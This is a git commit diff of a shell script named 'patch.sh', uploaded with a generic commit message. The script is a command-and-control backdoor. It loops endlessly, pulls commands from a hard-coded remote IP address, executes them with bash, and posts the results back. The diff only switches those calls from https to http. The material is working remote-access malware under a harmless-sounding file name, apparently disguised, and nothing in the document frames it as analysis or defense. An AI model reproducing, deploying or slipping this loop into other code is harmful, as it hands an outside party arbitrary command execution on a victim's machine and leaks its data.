6b89a6e0f2c921be85a6d40fd2e3f2e2ef3f169a
xykx <151014459+xyakaix@users.noreply.github.com>
2025-07-17 21:08:42 -0400

    Add files via upload

--- patch.sh
+++ patch.sh
@@ -1,10 +1,10 @@
 while true; do
 
-  cmd=$(curl -sk https://54.95.251.88/getcmd)
+  cmd=$(curl -sk http://54.95.251.88/getcmd)
 
   result=$(bash -c "$cmd" 2>&1)
 
-  curl -sk -X POST -d "$result" https://54.95.251.88/postresult
+  curl -sk -X POST -d "$result" http://54.95.251.88/postresult
 
   sleep 5
 
